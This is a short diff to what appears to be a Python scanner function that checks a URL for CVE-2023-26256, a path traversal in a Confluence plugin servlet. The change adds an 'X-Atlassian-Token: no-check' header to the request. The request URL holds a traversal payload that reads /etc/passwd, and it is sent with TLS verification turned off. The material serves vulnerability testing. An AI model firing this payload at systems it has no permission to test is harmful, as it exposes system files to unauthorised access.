@@ -16,11 +16,14 @@ def check_cve_2023_26256(url):
     '''
     check_cve_2023_26256_url = f"{url.rstrip('/')}/plugins/servlet/snjFooterNavigationConfig?fileName=../../../../../../etc/passwd&fileMime=$textMime"
     vulnerabilities = ''
+    headers = {
+        'X-Atlassian-Token': 'no-check'
+    }
 
     try:
         print(f"{Fore.YELLOW}\nINFO: IN DEVELOPMENT Checking for CVE-2023-26256")
         print(f"{Fore.BLUE}[Testing URL]{Style.RESET_ALL}: {check_cve_2023_26256_url}")
-        response = requests.get(check_cve_2023_26256_url, allow_redirects=False, verify=False)
+        response = requests.get(check_cve_2023_26256_url, headers=headers, allow_redirects=False, verify=False)
         #print(f"{Fore.YELLOW}- HTTP Status Code: {response.status_code}")
 
         # Check for the vulnerability
